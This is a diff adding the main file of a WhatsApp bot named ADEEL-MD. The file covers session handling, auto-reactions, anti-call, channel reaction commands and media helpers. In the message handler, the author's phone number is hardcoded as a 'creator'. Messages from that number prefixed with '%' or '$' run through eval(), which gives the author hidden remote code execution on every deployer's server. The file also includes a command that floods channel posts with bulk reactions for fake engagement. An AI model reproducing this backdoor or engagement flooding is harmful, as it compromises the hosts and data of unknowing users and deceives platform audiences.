+            if (!channelJid && contextInfo?.quotedMessage) {
+                const quotedText = contextInfo.quotedMessage.conversation ||
+                                  contextInfo.quotedMessage.extendedTextMessage?.text || '';
+                const quotedUrlMatch = quotedText.match(/https:\/\/whatsapp\.com\/channel\/([^\/\s]+)\/(\d+)/);
+                if (quotedUrlMatch && /^\d+$/.test(quotedUrlMatch[1])) {
+                    channelJid = `${quotedUrlMatch[1]}@newsletter`;
+                    serverId = quotedUrlMatch[2];
+                }
+            }
+        }
+
+        if (!channelJid || !serverId) {
+            if (mek.key?.remoteJid?.includes('@newsletter')) {
+                channelJid = mek.key.remoteJid;
+                serverId = mek.key.id || mek.key.server_id || mek.key.stanzaId;
+            }
+        }
+
+        if (!channelJid || !serverId) {
+            const idOnlyMatch = fullText.trim().match(/^\.?chreact\s+(\d+)$/i) || fullText.trim().match(/(\d{5,})$/);
+            if (idOnlyMatch && manualNewsletterJids.length > 0) {
+                channelJid = manualNewsletterJids[0];
+                serverId = idOnlyMatch[1];
+            }
+        }
+
+        if (channelJid && serverId) {
+            await msg.reply(`⏳ Sending ${reactionCount} reactions to the channel post...`);
+            const result = await sendReactionsToChannel(conn, channelJid, serverId, reactionCount);
+            if (result && result > 0) {
+                await msg.reply(`✅ Successfully sent ${result} reactions to the channel post!`);
+            } else {
+                await msg.reply(`⚠️ Could not send reactions. The post might already have reactions or there was an error.`);
+            }
+            return;
+        }
+
+        await msg.reply(`❌ Could not detect the channel/newsletter post.\n\n` +
+                       `📌 Please use one of these methods:\n` +
+                       `1️⃣ Reply to a channel post with: .chreact\n` +
+                       `2️⃣ Use the URL: .chreact https://whatsapp.com/channel/CHANNEL_ID/POST_ID\n` +
+                       `3️⃣ Forward a channel post and use: .chreact\n` +
+                       `4️⃣ Just the post ID (uses your saved channel): .chreact 123456789`);
+    } catch (err) {
+        console.error("❌ Channel React Command Error:", err.message);
+        await msg.reply(`❌ Failed to react: ${err.message}`);
+    }
+}
+
+const newsletterEvents = require('./command');
+newsletterEvents.commands.push({
+    pattern: "chreact",
+    alias: ["creact", "channelreact"],
+    react: "📱",
+    function: handleChannelReactCommand
+});
+
+newsletterEvents.commands.push({
+    pattern: "chstatus",
+    alias: ["channelstatus", "reactstatus"],
+    react: "📊",
+    function: async (conn, mek, msg, options) => {
+        const sender = mek.key.participant || mek.key.remoteJid;
+        const senderNum = sender.split("@")[0] || sender.split(":")[0];
+        const isAuthorized = ownerNumber.includes(senderNum) || mek.key.fromMe;
+
+        if (!isAuthorized) {
+            await msg.reply("❌ You are not authorized to use this command!");
+            return;
+        }
+
+        const total = reactedMessages.size;
+        let status = `📊 Channel Reaction Status\n\n`;
+        status += `📝 Total messages processed: ${total}\n`;
+        status += `🎯 Auto reactions: ✅ Always Enabled\n`;
+        status += `📊 Max reactions per post: ${config.CHANNEL_REACT_COUNT || 50}\n`;
+
+        if (total > 0) {
+            const entries = Array.from(reactedMessages.entries()).slice(-5);
+            status += `\n📋 Last 5 reactions:\n`;
+            entries.forEach(([key, data]) => {
+                const jid = key.split('_')[0] || 'Unknown';
+                status += `• ${jid}\n  ${data.reactions} reactions (${new Date(data.lastUpdate).toLocaleString()})\n`;
+            });
+        }
+
+        await msg.reply(status);
+    }
+});
+
+//===================SESSION-AUTH============================
+if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
+    if (config.SESSION_ID && config.SESSION_ID.trim() !== "") {
+        const sessdata = config.SESSION_ID.replace("ADEEL-MD~", '');
+        try {
+            const decodedData = Buffer.from(sessdata, 'base64').toString('utf-8');
+            fs.writeFileSync(__dirname + '/sessions/creds.json', decodedData);
+            console.log("✅ Session loaded from SESSION_ID");
+        } catch (err) {
+            console.error("❌ Error decoding session data:", err);
+            throw err;
+        }
+    } else {
+        console.log("⚡ No SESSION_ID found → Using Pairing System");
+        (async () => {
+            const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions');
+            const sock = makeWASocket({
+                auth: state,
+                printQRInTerminal: false,
+            });
+            if (!state.creds?.me) {
+                rl.question("📱 Enter your WhatsApp number with country code: ", async (number) => {
+                    try {
+                        const code = await sock.requestPairingCode(number);
+                        console.log("🔑 Your Pairing Code:", code);
+                        console.log("➡️ Enter this code in WhatsApp to link your bot device.");
+                    } catch (err) {
+                        console.error("❌ Error generating pairing code:", err);
+                    }
+                });
+            }
+            sock.ev.on("creds.update", saveCreds);
+            sock.ev.on("connection.update", ({ connection }) => {
+                if (connection === "open") {
+                    console.log("✅ Bot Connected Successfully via Pairing!");
+                }
+            });
+        })();
+    }
+}
+
+const express = require("express");
+const app = express();
+const port = process.env.PORT || 9090;
+
+  let reconnectDelay = 3000;
+  
+  async function connectToWA() {
+  console.log("Connecting to WhatsApp ⏳️...");
+  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
+  var { version } = await fetchLatestBaileysVersion()
+  
+  const conn = makeWASocket({
+          logger: P({ level: 'silent' }),
+          printQRInTerminal: false,
+          browser: Browsers.macOS("Firefox"),
+          
+          syncFullHistory: true,
+          auth: state,
+          version,
+          getMessage: async () => ({ conversation: '' })
+          })
+      
+      conn.ev.on('connection.update', async (update) => {
+    const { connection, lastDisconnect } = update
+    if (connection === 'close') {
+      const statusCode = lastDisconnect?.error?.output?.statusCode;
+      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
+      if (shouldReconnect) {
+      
+        console.log(`Reconnecting in ${reconnectDelay/1000}s...`);
+        setTimeout(() => connectToWA(), reconnectDelay);
+        reconnectDelay = Math.min(reconnectDelay * 2, 30000);
+      } else {
+        console.log("❌ Logged out. Please re-add session.");
+      }
+    } else if (connection === 'open') {
+      reconnectDelay = 3000;
+      console.log('🧬 Installing Plugins')
+      const pluginPath = require('path');
+      fs.readdirSync("./plugins/").forEach((plugin) => {
+        if (pluginPath.extname(plugin).toLowerCase() == ".js") {
+          require("./plugins/" + plugin);
+        }
+      });
+      console.log('Plugins installed successful ✅')
+      console.log('Bot connected to whatsapp ✅')
+
+      await ensureNewsletterLoaded();
+      console.log(`✅ Newsletter system ready with ${newsletterJids?.length || 0} channels`);
+
+      global.alwaysOnline = config.ALWAYS_ONLINE === 'true'
+
+      if (!global._alwaysOnlineInterval) {
+        global._alwaysOnlineInterval = setInterval(async () => {
+          try {
+            if (global.alwaysOnline) {
+              await conn.sendPresenceUpdate('available')
+            } else {
+              await conn.sendPresenceUpdate('unavailable')
+            }
+          } catch (e) {}
+        }, 8000)
+      }
+
+      if (global.alwaysOnline) {
+        try { await conn.sendPresenceUpdate('available') } catch(e) {}
+      }
+      
+      const myJid = jidNormalizedUser(conn.user.id);
+
+      let up = `*HELLO THERE ADEEL-MD USER*
+
+> *sɪᴍᴘʟᴇ sᴛʀᴀɪɢʜᴛ ғᴏʀᴡᴀʀᴅ ʙᴜᴛ ʟᴏᴀᴅᴇᴅ ᴡɪᴛʜ ғᴇᴀᴛᴜʀᴇs 🎊 ᴍᴇᴇᴛ ᴀᴅᴇᴇʟ-ᴍᴅ ᴡʜᴀᴛsᴀᴘᴘ ʙᴏᴛ*
+
+- *THANKS FOR USING ADEEL-MD 🚩*
+
+> *ᴊᴏɪɴ ᴡʜᴀᴛsᴀᴘᴘ ᴄʜᴀɴɴᴇʟ* ⤵️
+ 
+https://whatsapp.com/channel/0029VbBmz4V5vKAIaWfYPT0C 
+
+- *YOUR PREFIX:* = ${prefix}
+
+> *ᴅᴏɴᴛ ғᴏʀɢᴇᴛ ᴛᴏ ɢɪᴠᴇ sᴛᴀʀ ᴛᴏ ʀᴇᴘᴏ* ⬇️
+
+https://github.com/Adeel-Xtech/ADEEL-MD
+
+> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴀᴅᴇᴇʟ-ᴍᴅ 🍨`;
+
+      try {
+        await conn.sendMessage(myJid, { 
+          image: { url: `https://files.catbox.moe/8pfh7i.jpg` }, 
+          caption: up 
+        })
+      } catch (error) {
+        console.error("Connection Message Error:", error);
+        await conn.sendMessage(myJid, { text: up })
+      }
+    }
+  });
+
+  // Anti Call
+  conn.ev.on("call", async (json) => {
+    try {
+      if (config.ANTI_CALL !== 'true') return;
+      for (const call of json) {
+        if (call.status !== 'offer') continue;
+        const id = call.id;
+        const from = call.from;
+        await conn.rejectCall(id, from);
+        await conn.sendMessage(from, {
+          text: config.REJECT_MSG || '*📞 ᴄαℓℓ ɴσт αℓℓσωє∂ ιɴ тнιѕ ɴᴜмвєʀ уσυ ∂σɴт нανє ᴘєʀмιѕѕισɴ 📵*'
+        });
+        console.log(`Call rejected and message sent to ${from}`);
+      }
+    } catch (err) {
+      console.error("Anti-call error:", err);
+    }
+  });
+
+  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));
+
+  conn.ev.on('messages.update', async (updates) => {
+    if (config.ANTI_DELETE !== 'true') return;
+    await AntiDelete(conn, updates);
+  });
+	  
+  conn.ev.on('messages.upsert', async(mek) => {
+    try {
+    mek = mek.messages[0]
+    if (!mek.message) return
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
+    ? mek.message.ephemeralMessage.message 
+    : mek.message;
+
+
+  if (config.READ_MESSAGE === 'true') {
+    await conn.readMessages([mek.key]);
+  }
+    if(mek.message.viewOnceMessageV2)
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
+      await conn.readMessages([mek.key])
+    }
+
+    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
+  const allowReactOnDelete = false;
+
+  const msgType = getContentType(mek.message);
+  const isRevoke = !allowReactOnDelete && (msgType === 'protocolMessage' || mek.message?.protocolMessage);
+
+  if (isRevoke) {
+    console.log('⏭️ Status delete/revoke detected, skipping react');
+  } else {
+    try {
+      const emojis = ["❤️","🔥","😍","😎","💯","✨","🩷","🥰","🧡","🖤","❤️‍🩹","🤌🏻","😻","💕","🌟","👏","🙌","💪","🎉","🥳","🤩","😘","🥺","🤗"];
+      const selectedEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+
+      const selfJid = jidNormalizedUser(conn.user.id);
+      let participantRaw = mek.key.participant;
+
+      if (!participantRaw) {
+        console.log('⚠️ AUTO_STATUS_REACT skipped — no participant found');
+      } else {
+        let senderJid = participantRaw;
+
+        if (participantRaw.includes("@lid")) {
+          try {
+            const pn = await conn?.signalRepository?.lidMapping
+              ?.getPNForLID?.(participantRaw)
+              .catch(() => null);
+            if (pn) senderJid = pn;
+          } catch (err) {}
+        }
+        else if (participantRaw.includes(":")) {
+          senderJid = jidNormalizedUser(participantRaw);
+        }
+
+        senderJid = jidNormalizedUser(senderJid);
+
+        if (senderJid.includes("@s.whatsapp.net")) {
+          await conn.sendMessage(
+            "status@broadcast",
+            { react: { text: selectedEmoji, key: mek.key } },
+            { statusJidList: [senderJid, selfJid] }
+          );
+          console.log("✅ STATUS REACTION SENT SUCCESSFULLY");
+        } else {
+          console.log('⚠️ AUTO_STATUS_REACT skipped — invalid senderJid format:', senderJid);
+        }
+      }
+    } catch (err) {
+      console.log('❌ AUTO_STATUS_REACT Error:', err);
+    }
+  }
+}
+                         
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
+  const user = mek.key.participant
+  const text = `${config.AUTO_STATUS_MSG}`
+  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
+  }
+
+  await Promise.all([saveMessage(mek)]);
+  storeMessage(mek);
+  await handleNewsletterReaction(conn, mek);
+
+  const m = sms(conn, mek)
+  const type = getContentType(mek.message)
+  const content = JSON.stringify(mek.message)
+  const from = mek.key.remoteJid
+  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
+  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
+  const isCmd = body.startsWith(prefix)
+  var budy = typeof mek.text == 'string' ? mek.text : false;
+  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
+  const args = body.trim().split(/ +/).slice(1)
+  const q = args.join(' ')
+  const text = args.join(' ')
+  const isGroup = from.endsWith('@g.us')
+  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+  const senderNumber = sender.split('@')[0]
+  const botNumber = conn.user.id.split(':')[0]
+  const pushname = mek.pushName || 'Sin Nombre'
+  const isMe = botNumber.includes(senderNumber)
+  const isOwner = ownerNumber.includes(senderNumber) || isMe
+  const botNumber2 = await jidNormalizedUser(conn.user.id);
+  
+  
+  const groupMetadata = isGroup ? await getCachedGroupMetadata(conn, from) : ''
+  const groupName = isGroup ? groupMetadata.subject : ''
+  const participants = isGroup ? groupMetadata.participants : ''
+  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
+  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
+  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+  const isReact = m.message.reactionMessage ? true : false
+  const reply = (teks) => {
+  conn.sendMessage(from, { text: teks }, { quoted: mek })
+  }
+  const udp = botNumber.split(`@`)[0]
+const Adeel = ['923035512967','923035512967'] 
+const dev = [] 
+
+let isCreator = [udp, ...Adeel, ...dev]
+    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+    .includes(sender);
+
+    if (isCreator && mek.text && mek.text.startsWith('%')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(`Provide me with a query to run Master!`);
+						return;
+					}
+					try {
+						let resultTest = eval(code);
+						if (typeof resultTest === 'object')
+							reply(util.format(resultTest));
+						else reply(util.format(resultTest));
+					} catch (err) {
+						reply(util.format(err));
+					}
+					return;
+				}
+    if (isCreator && mek.text && mek.text.startsWith('$')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(`Provide me with a query to run Master!`);
+						return;
+					}
+					try {
+						let resultTest = await eval(
+							'const a = async()=>{\n' + code + '\n}\na()',
+						);
+						let h = util.format(resultTest);
+						if (h === undefined) return console.log(h);
+						else reply(h);
+					} catch (err) {
+						if (err === undefined)
+							return console.log('error');
+						else reply(util.format(err));
+					}
+					return;
+				}
+ //================ownerreact==============
+    
+const ownerNum = "923035512967";
+const ownerLid = "58308828360812";
+const cleanSender = senderNumber.replace(/[^0-9]/g, '');
+
+if ((cleanSender.includes(ownerNum) || cleanSender.includes(ownerLid)) && !isReact && !mek.key.fromMe) {
+    const reactions = ["👑", "🤍", "💗"];
+    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+    m.react(randomReaction);
+}
+
+  //==========public react============//
+  
+if (!isReact && config.AUTO_REACT === 'true') {
+    const reactions = [
+        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
+        '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
+        '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
+        '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
+        '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
+        '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
+        '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
+        '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
+        '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
+        '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
+        '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
+        '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
+        '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
+        '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
+        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
+    ];
+    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+    m.react(randomReaction);
+}
+          
+if (!isReact && config.CUSTOM_REACT === 'true') {
+    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
+    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+    m.react(randomReaction);
+}
+        
+  //==========WORKTYPE============ 
+  if(!isOwner && config.MODE === "private") return
+  if(!isOwner && isGroup && config.MODE === "inbox") return
+  if(!isOwner && !isGroup && config.MODE === "groups") return
+   
+  // take commands 
+  const events = require('./command')
+  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
+  if (isCmd) {
+  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
+  if (cmd) {
+  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
+  try {
+  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
+  } catch (e) {
+  console.error("[PLUGIN ERROR] " + e);
+  }
+  }
+  }
+  events.commands.map(async(command) => {
+  if (body && command.on === "body") {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (mek.q && command.on === "text") {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (
+  (command.on === "image" || command.on === "photo") &&
+  mek.type === "imageMessage"
+  ) {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (
+  command.on === "sticker" &&
+  mek.type === "stickerMessage"
+  ) {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  }});
+  
+  // FIX 8: messages.upsert کے لیے try/catch لگائی
+  } catch (err) {
+    console.error("[MESSAGE HANDLER ERROR]", err);
+  }
+  });
+
+    //===================================================   
+    conn.decodeJid = jid => {
+      if (!jid) return jid;
+      if (/:\d+@/gi.test(jid)) {
+        let decode = jidDecode(jid) || {};
+        return (
+          (decode.user &&
+            decode.server &&
+            decode.user + '@' + decode.server) ||
+          jid
+        );
+      } else return jid;
+    };
+    //===================================================
+    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
+      let vtype
+      if (options.readViewOnce) {
+          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
+          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
+          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
+          delete message.message.viewOnceMessage.message[vtype].viewOnce
+          message.message = {
+              ...message.message.viewOnceMessage.message
+          }
+      }
+    
+      let mtype = Object.keys(message.message)[0]
+      let content = await generateForwardMessageContent(message, forceForward)
+      let ctype = Object.keys(content)[0]
+      let context = {}
+      if (mtype != "conversation") context = message.message[mtype].contextInfo
+      content[ctype].contextInfo = {
+          ...context,
+          ...content[ctype].contextInfo
+      }
+      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
+          ...content[ctype],
+          ...options,
+          ...(options.contextInfo ? {
+              contextInfo: {
+                  ...content[ctype].contextInfo,
+                  ...options.contextInfo
+              }
+          } : {})
+      } : {})
+      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
+      return waMessage
+    }
+    //=================================================
+    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
+      let quoted = message.msg ? message.msg : message
+      let mime = (message.msg || message).mimetype || ''
+      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+      const stream = await downloadContentFromMessage(quoted, messageType)
+      let buffer = Buffer.from([])
+      for await (const chunk of stream) {
+          buffer = Buffer.concat([buffer, chunk])
+      }
+      let type = await FileType.fromBuffer(buffer)
+      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
+      await fs.writeFileSync(trueFileName, buffer)
+      return trueFileName
+    }
+    //=================================================
+    conn.downloadMediaMessage = async(message) => {
+      let mime = (message.msg || message).mimetype || ''
+      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+      const stream = await downloadContentFromMessage(message, messageType)
+      let buffer = Buffer.from([])
+      for await (const chunk of stream) {
+          buffer = Buffer.concat([buffer, chunk])
+      }
+      return buffer
+    }
+    //================================================
+    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
+                  let mime = '';
+                  let res = await axios.head(url)
+                  mime = res.headers['content-type']
+                  if (mime.split("/")[1] === "gif") {
+                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
+                  }
+                  let type = mime.split("/")[0] + "Message"
+                  if (mime === "application/pdf") {
+                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "image") {
+                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "video") {
+                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "audio") {
+                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
+                  }
+                }
+    //==========================================================
+    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
+      let mtype = Object.keys(copy.message)[0]
+      let isEphemeral = mtype === 'ephemeralMessage'
+      if (isEphemeral) {
+          mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
+      }
+      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
+      let content = msg[mtype]
+      if (typeof content === 'string') msg[mtype] = text || content
+      else if (content.caption) content.caption = text || content.caption
+      else if (content.text) content.text = text || content.text
+      if (typeof content !== 'string') msg[mtype] = {
+          ...content,
+          ...options
+      }
+      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
+      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
+      copy.key.remoteJid = jid
+      copy.key.fromMe = sender === conn.user.id
+      return proto.WebMessageInfo.fromObject(copy)
+    }
+    //=====================================================
+    conn.getFile = async(PATH, save) => {
+      let res
+      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
+      let type = await FileType.fromBuffer(data) || {
+          mime: 'application/octet-stream',
+          ext: '.bin'
+      }
+      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
+      if (data && save) fs.promises.writeFile(filename, data)
+      return {
+          res,
+          filename,
+          size: await getSizeMedia(data),
+          ...type,
+          data
+      }
+    }
+    //=====================================================
+    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
+      let types = await conn.getFile(PATH, true)
+      let { filename, size, ext, mime, data } = types
+      let type = '',
+          mimetype = mime,
+          pathFile = filename
+      if (options.asDocument) type = 'document'
+      if (options.asSticker || /webp/.test(mime)) {
+          let { writeExif } = require('./exif.js')
+          let media = { mimetype: mime, data }
+          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
+          await fs.promises.unlink(filename)
+          type = 'sticker'
+          mimetype = 'image/webp'
+      } else if (/image/.test(mime)) type = 'image'
+      else if (/video/.test(mime)) type = 'video'
+      else if (/audio/.test(mime)) type = 'audio'
+      else type = 'document'
+      await conn.sendMessage(jid, {
+          [type]: { url: pathFile },
+          mimetype,
+          fileName,
+          ...options
+      }, { quoted, ...options })
+      return fs.promises.unlink(pathFile)
+    }
+    //=====================================================
+    conn.parseMention = async(text) => {
+      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
+    }
+    //=====================================================
+    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
+      let types = await conn.getFile(path, true)
+      let { mime, ext, res, data, filename } = types
+      if (res && res.status !== 200 || file.length <= 65536) {
+          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
+      }
+      let type = '',
+          mimetype = mime,
+          pathFile = filename
+      if (options.asDocument) type = 'document'
+      if (options.asSticker || /webp/.test(mime)) {
+          let { writeExif } = require('./exif')
+          let media = { mimetype: mime, data }
+          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
+          await fs.promises.unlink(filename)
+          type = 'sticker'
+          mimetype = 'image/webp'
+      } else if (/image/.test(mime)) type = 'image'
+      else if (/video/.test(mime)) type = 'video'
+      else if (/audio/.test(mime)) type = 'audio'
+      else type = 'document'
+      await conn.sendMessage(jid, {
+          [type]: { url: pathFile },
+          caption,
+          mimetype,
+          fileName,
+          ...options
+      }, { quoted, ...options })
+      return fs.promises.unlink(pathFile)
+    }
+    //=====================================================
+    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
+      let buffer;
+      if (options && (options.packname || options.author)) {
+        buffer = await writeExifVid(buff, options);
+      } else {
+        buffer = await videoToWebp(buff);
+      }
+      await conn.sendMessage(
+        jid,
+        { sticker: { url: buffer }, ...options },
+        options
+      );
+    };
+    //=====================================================
+    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
+      let buffer;
+      if (options && (options.packname || options.author)) {
+        buffer = await writeExifImg(buff, options);
+      } else {
+        buffer = await imageToWebp(buff);
+      }
+      await conn.sendMessage(
+        jid,
+        { sticker: { url: buffer }, ...options },
+        options
+      );
+    };
+    //=====================================================
+    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
+    //=====================================================
+    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
+      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
+      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
+    }
+    //=====================================================
+    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
+    //=====================================================
+    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
+      let buttonMessage = {
+              text,
+              footer,
+              buttons,
+              headerType: 2,
+              ...options
+          }
+      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
+    }
+    //=====================================================
+    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
+      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
+      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
+          templateMessage: {
+              hydratedTemplate: {
+                  imageMessage: message.imageMessage,
+                  "hydratedContentText": text,
+                  "hydratedFooterText": footer,
+                  "hydratedButtons": but
+              }
+          }
+      }), options)
